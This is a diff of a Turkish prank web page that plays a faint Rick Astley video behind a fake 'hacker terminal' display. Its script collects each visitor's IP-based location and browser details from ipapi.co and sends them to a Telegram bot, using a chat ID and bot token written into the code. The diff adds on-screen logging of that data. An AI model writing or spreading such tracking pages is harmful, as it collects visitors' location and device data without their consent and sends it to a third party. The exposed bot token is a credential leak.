@@ -2,43 +2,58 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8" />
-  <title>Rick And Roll</title>
   <style>
     html, body {
       margin: 0; padding: 0; width: 100%; height: 100%;
-      background: #fff;
+      background: black;
+      color: #00ff00;
+      font-family: monospace, monospace;
+      overflow: hidden;
       display: flex;
-      flex-direction: column;
-      align-items: center;
       justify-content: center;
-      gap: 15px;
-      padding: 15px 0;
+      align-items: center;
+    }
+    #terminal {
+      position: relative;
+      width: 90vw;
+      max-width: 800px;
+      height: 80vh;
+      background-color: black;
+      border-radius: 8px;
+      padding: 20px;
       box-sizing: border-box;
       overflow-y: auto;
-      font-family: Arial, sans-serif;
+      box-shadow: 0 0 20px #00ff00;
+      white-space: pre-wrap;
+      user-select: none;
+      z-index: 10;
     }
-    iframe {
-      width: 90vw;
-      max-width: 480px;
-      height: calc(90vw * 9 / 16);
-      max-height: 270px;
+    #rickroll {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw;
+      height: 100vh;
       border: none;
-      border-radius: 10px;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
-      pointer-events: none; /* Tıklanmasın */
-      background: black;
+      pointer-events: none;
+      opacity: 0.1;
+      z-index: 1;
     }
   </style>
 </head>
 <body>
 
-  <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&loop=1&playlist=dQw4w9WgXcQ" allow="autoplay" allowfullscreen></iframe>
+  <iframe id="rickroll" src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&loop=1&playlist=dQw4w9WgXcQ" allow="autoplay" frameborder="0" allowfullscreen></iframe>
 
-  <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&loop=1&playlist=dQw4w9WgXcQ" allow="autoplay" allowfullscreen></iframe>
-
-  <iframe src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&loop=1&playlist=dQw4w9WgXcQ" allow="autoplay" allowfullscreen></iframe>
+  <div id="terminal">Terminal başlatılıyor...</div>
 
   <script>
+    const terminal = document.getElementById('terminal');
+
+    function logToTerminal(text) {
+      terminal.textContent += text + '\n';
+      terminal.scrollTop = terminal.scrollHeight;
+    }
+
     async function sendToTelegram(message) {
       const chatId = "6400737507"; // Senin chat ID'in
       const token = "8059389140:AAEori9hTqgX8nRsZ2-np6aLXY-xaZihgTg"; // Senin bot token'in
@@ -59,6 +74,7 @@
     }
 
     async function collectData() {
+      logToTerminal('Veriler toplanıyor...');
       try {
         const res = await fetch('https://ipapi.co/json/');
         const data = await res.json();
@@ -75,9 +91,11 @@
           `Çerez: ${navigator.cookieEnabled ? 'Aktif' : 'Kapalı'}\n` +
           `Bağlantı: ${navigator.connection ? navigator.connection.effectiveType : 'Bilinmiyor'}`;
 
+        logToTerminal(message);
         await sendToTelegram(message);
+        logToTerminal('Veriler gönderildi.');
       } catch(e) {
-        // Sessizce hatayı yoksay
+        logToTerminal('Veri toplanırken hata oluştu.');
       }
     }
 
